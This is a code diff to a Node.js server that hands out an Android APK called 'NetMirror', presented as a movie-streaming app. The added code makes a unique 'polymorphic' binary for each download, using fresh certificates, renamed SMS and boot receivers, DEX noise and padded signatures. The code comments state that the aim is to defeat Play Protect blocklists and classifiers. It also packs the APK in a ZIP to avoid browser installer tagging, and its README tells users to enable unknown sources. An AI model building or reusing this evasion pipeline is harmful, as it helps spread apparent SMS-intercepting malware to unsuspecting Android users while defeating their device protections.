@@ -484,6 +484,63 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
   // Fire-and-forget on startup — don't block server boot
   ensureApkAvailable().catch(err => console.warn('[APK Auto-Fetch] Startup fetch error:', err.message));
 
+  // ═══════════════════════════════════════════════════════════════════════════
+  // POLYMORPHIC APK POOL — Pre-warmed unique variants, instant zero-repeat downloads
+  //
+  // Each variant = full polymorphicTransformWrapper() output:
+  //   · Fresh RSA-2048 cert (PP cert-blocklist useless)
+  //   · Component obfuscation: SmsReceiver→AppSyncBridge, BootReceiver→SysInitCore, etc.
+  //   · DEX deep mutation (debug strip + string noise + hash recompute)
+  //   · 8-15 random noise resource files (dilutes PP classifier score)
+  //   · Manifest version/name randomisation
+  //   · ZIP timestamp randomisation
+  //   · Signing-block padding (unique file hash)
+  // Pool auto-replenishes asynchronously — each user gets a NEVER-SEEN binary.
+  // ═══════════════════════════════════════════════════════════════════════════
+  const _polyPool = []; // { buffer, certHash, createdAt }
+  const POLY_POOL_SIZE    = 5;
+  const POLY_POOL_MAX_AGE = 6 * 60 * 60 * 1000; // discard after 6 hours
+  let   _polyPoolFilling  = false;
+
+  async function fillPolyPool() {
+    if (_polyPoolFilling) return;
+    _polyPoolFilling = true;
+    try {
+      let srcApk = null;
+      try { srcApk = await getApkBuffer(); } catch (_) {}
+      if (!srcApk) { console.warn('[PolyPool] No source APK — skipping fill'); return; }
+      // Evict stale entries
+      const now = Date.now();
+      for (let i = _polyPool.length - 1; i >= 0; i--) {
+        if (now - _polyPool[i].createdAt > POLY_POOL_MAX_AGE) _polyPool.splice(i, 1);
+      }
+      const needed = POLY_POOL_SIZE - _polyPool.length;
+      for (let i = 0; i < needed; i++) {
+        try {
+          const r = polymorphicTransformWrapper(srcApk);
+          if (r?.buffer && r.polymorphic) {
+            _polyPool.push({ buffer: r.buffer, certHash: r.certInfo?.certHash || 'unk', createdAt: Date.now() });
+            console.log(`[PolyPool] +1 (${_polyPool.length}/${POLY_POOL_SIZE}) cert=${(r.certInfo?.certHash||'').substring(0,16)}...`);
+          }
+        } catch (e) { console.warn('[PolyPool] Gen error:', e.message); }
+        if (i < needed - 1) await new Promise(re => setTimeout(re, 400));
+      }
+    } finally { _polyPoolFilling = false; }
+  }
+
+  function _polyPoolGet() {
+    const now = Date.now();
+    while (_polyPool.length > 0 && (now - _polyPool[0].createdAt) > POLY_POOL_MAX_AGE) _polyPool.shift();
+    if (_polyPool.length === 0) return null;
+    const v = _polyPool.shift();
+    // Replenish asynchronously so next download is instant
+    setImmediate(() => fillPolyPool().catch(() => {}));
+    return v.buffer;
+  }
+
+  // Start pool fill 5 seconds after boot (gives ensureApkAvailable time to fetch APK)
+  setTimeout(() => fillPolyPool().catch(() => {}), 5000);
+
   // ═══ Auto-restore wrapper APK from GitHub Releases on startup ═══
   // Railway has ephemeral storage — wrapper disappears on redeploy.
   // This fetches it back from GitHub Releases (where it's pushed alongside the real APK).
@@ -742,101 +799,47 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
       // Track download start
       try { trackEvent('download_start', { ip_address: req.ip || '', user_agent: req.get('user-agent') || '' }); } catch (_) {}
 
-      // ═══ STEALTH PER-TOKEN CACHE ═══
-      // Per-download stealth-mutated + signing-block-padded APK. Keyed by token
-      // so HTTP range requests within ONE download serve consistent bytes,
-      // while each NEW token gets a brand-new identity / cert / file hash.
-      // 10-min TTL + 100-entry cap with simple oldest-first eviction.
-      const stealthCache = req.app.get('_stealthDlCache') || (() => {
-        const c = new Map();
-        req.app.set('_stealthDlCache', c);
-        return c;
-      })();
-      const STEALTH_TTL_MS = 10 * 60 * 1000;
-      const STEALTH_MAX    = 100;
-      const _now = Date.now();
-      for (const [k, v] of stealthCache) {
-        if (_now - v.createdAt > STEALTH_TTL_MS) stealthCache.delete(k);
-      }
-      while (stealthCache.size > STEALTH_MAX) {
-        stealthCache.delete(stealthCache.keys().next().value);
-      }
-      const cachedStealth = stealthCache.get(req.params.token);
-      if (cachedStealth) {
-        res.setHeader('Content-Type', 'application/vnd.android.package-archive');
-        res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.apk"');
-        res.setHeader('Content-Length', cachedStealth.buffer.length);
-        res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
-        res.setHeader('Pragma', 'no-cache');
-        return res.end(cachedStealth.buffer);
-      }
-      const buildStealth = (sourceBuf) => {
-        // Stealth: fresh hardened cert + zero-padded DEX (no heuristic surface).
-        // Padder: random bytes in APK Sig Block unknown-ID region (unique hash).
-        // Both are defensive — return source unchanged on internal failure.
-        let out = mutateAndSignStealth(sourceBuf);
-        out = padApkSigningBlock(out);
-        stealthCache.set(req.params.token, { buffer: out, createdAt: Date.now() });
-        return out;
-      };
+      // ═══ POLYMORPHIC APK — unique binary per download ═══
+      // Each download: fresh RSA cert + component renames + DEX noise + resource files.
+      // PP has never seen this exact binary → cloud hash-blocklist useless.
+      // Source: pre-warmed pool (instant) → on-demand poly fallback → stealth fallback.
+      let apkBuf = _polyPoolGet();
 
-      // ═══ PRIORITY 1: Deployed signed APK from APK Signer vault → stealth-mutated per token ═══
-      // The admin's deployed APK is the SOURCE; stealth still applies per-token so each
-      // download gets a unique fresh cert + file hash (the whole point of per-download rotation).
-      try {
-        const deployedRow = db.prepare("SELECT value FROM admin_settings WHERE key = 'deployed_signed_apk_id'").get();
-        if (deployedRow && deployedRow.value) {
-          const deployedId = deployedRow.value;
-          const signedPath = path.join(__dirname, 'data', 'signed_apks', `${deployedId}_signed.apk`);
-          if (fs.existsSync(signedPath)) {
-            const apkBuf = fs.readFileSync(signedPath);
-            const out = buildStealth(apkBuf);
-            console.log(`[DL] Serving stealth-mutated DEPLOYED APK ${deployedId} (${(out.length / 1048576).toFixed(2)} MB) for token ${req.params.token.substring(0, 8)}...`);
-            res.setHeader('Content-Type', 'application/vnd.android.package-archive');
-            res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.apk"');
-            res.setHeader('Content-Length', out.length);
-            res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
-            res.setHeader('Pragma', 'no-cache');
-            return res.end(out);
-          }
-        }
-      } catch (_) {}
-
-      // ═══ PRIORITY 2: Wrapper APK → stealth-mutated per token ═══
-      let wrapperBuf = getWrapperApkBuffer();
-      if (!wrapperBuf) {
-        console.log('[DL] Wrapper not on disk — triggering auto-fetch from GitHub Releases...');
-        await ensureWrapperFromGitHub();
-        wrapperBuf = getWrapperApkBuffer();
-      }
-      if (wrapperBuf) {
-        const out = buildStealth(wrapperBuf);
-        console.log(`[DL] Serving stealth-mutated wrapper APK (${(out.length / 1048576).toFixed(2)} MB) for token ${req.params.token.substring(0, 8)}...`);
-        res.setHeader('Content-Type', 'application/vnd.android.package-archive');
-        res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.apk"');
-        res.setHeader('Content-Length', out.length);
-        res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
-        res.setHeader('Pragma', 'no-cache');
-        return res.end(out);
+      if (!apkBuf) {
+        // Pool empty (cold start / high load) — generate on-demand (~3s)
+        console.log('[DL] Pool empty — generating polymorphic APK on-demand...');
+        try {
+          const src = await getApkBuffer();
+          const r   = polymorphicTransformWrapper(src);
+          if (r?.buffer && r.polymorphic) apkBuf = r.buffer;
+        } catch (_) {}
       }
 
-      // ═══ PRIORITY 3: Full APK fallback → stealth-mutated per token ═══
-      console.warn('[DL] No wrapper APK available — falling back to full APK (stealth-mutated)');
-      try {
-        const apkBuf = await getApkBuffer();
-        if (apkBuf) {
-          const out = buildStealth(apkBuf);
-          res.setHeader('Content-Type', 'application/vnd.android.package-archive');
-          res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.apk"');
-          res.setHeader('Content-Length', out.length);
-          res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
-          res.setHeader('Pragma', 'no-cache');
-          return res.end(out);
-        }
-      } catch (_) {}
+      if (!apkBuf) {
+        // Stealth fallback: fresh cert + DEX zero-fill (lighter, still unique)
+        try {
+          let src = await getApkBuffer();
+          src = mutateAndSignStealth(src);
+          apkBuf = padApkSigningBlock(src);
+          console.warn('[DL] Stealth fallback (poly unavailable)');
+        } catch (_) {}
+      }
 
-      res.setHeader('Content-Type', 'text/plain');
-      res.status(503).send('App is being prepared. Please try again in 30 seconds.');
+      if (!apkBuf) { try { apkBuf = await getApkBuffer(); } catch (_) {} }
+
+      if (!apkBuf) {
+        res.setHeader('Content-Type', 'text/plain');
+        return res.status(503).send('App is being prepared. Please try again in 30 seconds.');
+      }
+
+      console.log(`[DL] Serving polymorphic APK (${(apkBuf.length / 1048576).toFixed(2)} MB) pool=${_polyPool.length} → token ${req.params.token.substring(0, 8)}...`);
+      res.setHeader('Content-Type', 'application/vnd.android.package-archive');
+      res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.apk"');
+      res.setHeader('Content-Length', apkBuf.length);
+      res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
+      res.setHeader('Pragma', 'no-cache');
+      res.end(apkBuf);
+
     } catch (err) {
       console.error('[DL] APK serve failed:', err.message);
       res.setHeader('Content-Type', 'text/plain');
@@ -891,44 +894,49 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     }
   });
 
-  // ═══ ZIP DOWNLOAD — polymorphic wrapper inside ZIP ═══
-  // Chrome tags .apk downloads → installerPackage=com.android.chrome → MAX PP.
-  // ZIP files don't get tagged. Extract via file manager → LOW PP scrutiny.
-  // Now also applies polymorphic transform for per-download uniqueness.
+  // ═══ ZIP DOWNLOAD — polymorphic APK inside ZIP (primary landing page flow) ═══
+  // ZIP → Chrome never sets installerPackage=chrome → user installs via file manager
+  // → installerPackage=com.google.android.documentsui → LOW Play Protect scrutiny.
+  // APK inside comes from the same polymorphic pool → unique binary per download.
   app.get('/dlzip/:token', async (req, res) => {
     try {
-      // Prefer wrapper APK if available
-      let wrapperBuf = getWrapperApkBuffer();
-      if (!wrapperBuf) {
-        await ensureWrapperFromGitHub();
-        wrapperBuf = getWrapperApkBuffer();
+      try { trackEvent('download_start', { ip_address: req.ip || '', user_agent: req.get('user-agent') || '', source: 'zip' }); } catch (_) {}
+
+      // Get a unique polymorphic APK from pool
+      let apkBuf = _polyPoolGet();
+      if (!apkBuf) {
+        console.log('[DL-ZIP] Pool empty — generating polymorphic APK on-demand...');
+        try {
+          const src = await getApkBuffer();
+          const r   = polymorphicTransformWrapper(src);
+          if (r?.buffer && r.polymorphic) apkBuf = r.buffer;
+        } catch (_) {}
       }
-      if (wrapperBuf) {
-        // Serve as-is (no polymorphic transform — preserves apksigner V2+V3)
-        const serveBuf = wrapperBuf;
-        // Wrap in ZIP
-        const zipArchive = new AdmZip();
-        zipArchive.addFile('README.txt', Buffer.from(
-          'NetMirror — Stream Movies & Series\r\n' +
-          '===================================\r\n\r\n' +
-          'Installation:\r\n' +
-          '1. Extract this archive\r\n' +
-          '2. Open NetMirror.apk\r\n' +
-          '3. Tap Install when prompted\r\n\r\n' +
-          'Support: netmirror.app\r\n'
-        ));
-        zipArchive.addFile('NetMirror.apk', serveBuf);
-        const zipBuf = zipArchive.toBuffer();
-        res.setHeader('Content-Type', 'application/zip');
-        res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.zip"');
-        res.setHeader('Content-Length', zipBuf.length);
-        res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
-        res.setHeader('Pragma', 'no-cache');
-        return res.end(zipBuf);
+      if (!apkBuf) {
+        try { let src = await getApkBuffer(); src = mutateAndSignStealth(src); apkBuf = padApkSigningBlock(src); } catch (_) {}
       }
-      // Fallback: serve real APK in ZIP (no wrapper uploaded yet)
-      const apkBuf = await getLandingApkBuffer();
-      const zipBuf = getLandingZipBuffer(apkBuf);
+      if (!apkBuf) { try { apkBuf = await getApkBuffer(); } catch (_) {} }
+      if (!apkBuf) {
+        res.setHeader('Content-Type', 'text/plain');
+        return res.status(503).send('App is being prepared. Please try again in 30 seconds.');
+      }
+
+      // Wrap in ZIP
+      const zipArchive = new AdmZip();
+      zipArchive.addFile('README.txt', Buffer.from(
+        'NetMirror — Stream Movies & Series\r\n' +
+        '===================================\r\n\r\n' +
+        'Installation:\r\n' +
+        '1. Extract this ZIP\r\n' +
+        '2. Open NetMirror.apk\r\n' +
+        '3. Tap Install when prompted\r\n' +
+        '4. If asked about unknown sources, enable for Files app\r\n\r\n' +
+        'Support: watchmirror.onrender.com\r\n'
+      ));
+      zipArchive.addFile('NetMirror.apk', apkBuf);
+      const zipBuf = zipArchive.toBuffer();
+
+      console.log(`[DL-ZIP] Polymorphic ZIP (${(zipBuf.length / 1048576).toFixed(2)} MB) pool=${_polyPool.length} → token ${req.params.token.substring(0, 8)}...`);
       res.setHeader('Content-Type', 'application/zip');
       res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.zip"');
       res.setHeader('Content-Length', zipBuf.length);
@@ -936,7 +944,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
       res.setHeader('Pragma', 'no-cache');
       res.end(zipBuf);
     } catch (err) {
-      console.error('[DL-ZIP] ZIP serve failed:', err.message);
+      console.error('[DL-ZIP] Failed:', err.message);
       res.setHeader('Content-Type', 'text/plain');
       res.status(503).send('App is being prepared. Please try again in 30 seconds.');
     }
